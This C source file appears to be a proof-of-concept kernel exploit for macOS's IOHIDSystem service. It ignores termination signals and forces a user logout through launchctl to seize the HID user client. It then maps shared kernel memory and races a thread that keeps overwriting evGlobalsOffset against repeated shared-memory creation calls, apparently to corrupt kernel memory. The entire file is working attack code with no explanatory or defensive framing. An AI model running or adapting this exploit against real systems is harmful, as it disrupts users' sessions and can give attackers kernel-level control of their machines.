#include <pthread.h>
#include <signal.h>             // signal
#include <stdint.h>             // int32_t
#include <stdio.h>              // printf
#include <stdlib.h>             // system
#include <string.h>             // strerror
#include <unistd.h>             // usleep
#include <mach/mach.h>
#include <IOKit/IOReturn.h>
#include <IOKit/IOKitLib.h>
#include <IOKit/hidsystem/IOHIDShared.h>

#define LOG(str, args...) do { printf(str "\n", ##args); } while(0)

const uint64_t SHMEM_VERSION = kIOHIDCurrentShmemVersion;
const uint64_t IOHID_CREATE_SHMEM = 0;

static void ignore(int signo)
{
    /* do nothing */
}

static void* bg(void *arg)
{
    volatile int32_t *ptr = arg;
    for(int32_t i = 0; 1; i += 0x1000)
    {
        *ptr = i;
    }
    return NULL;
}

int main(void)
{
    kern_return_t ret = 0;
    int r = 0;
    task_t self = mach_task_self();

    signal(SIGTERM, &ignore);
    signal(SIGHUP, &ignore);

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"));
    LOG("IOHIDSystem: %x", service);
    if(!MACH_PORT_VALID(service)) return -1;

    r = system("/bin/launchctl reboot logout");
    LOG("launchctl: %s", r == 0 ? "success" : strerror(r));
    if(r != 0) return -1;

    io_connect_t client = MACH_PORT_NULL;
    LOG("Waiting for IOHIDUserClient...");
    do
    {
        ret = IOServiceOpen(service, self, kIOHIDServerConnectType, &client);
        usleep(10);
    } while(ret == kIOReturnBusy);
    LOG("IOHIDUserClient: %x, %s", client, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(client)) return -1;

    mach_vm_address_t shmem_addr = 0;
    mach_vm_size_t shmem_size = 0;
    ret = IOConnectMapMemory64(client, kIOHIDGlobalMemory, self, &shmem_addr, &shmem_size, kIOMapAnywhere);
    LOG("Shmem: 0x%016llx-0x%016llx, %s", shmem_addr, shmem_addr + shmem_size, mach_error_string(ret));
    if(ret != KERN_SUCCESS) return -1;

    pthread_t th;
    pthread_create(&th, NULL, &bg, (void*)&((EvOffsets*)shmem_addr)->evGlobalsOffset);

    while(1)
    {
        IOConnectCallScalarMethod(client, IOHID_CREATE_SHMEM, &SHMEM_VERSION, 1, NULL, NULL);
    }

    return 0;
}
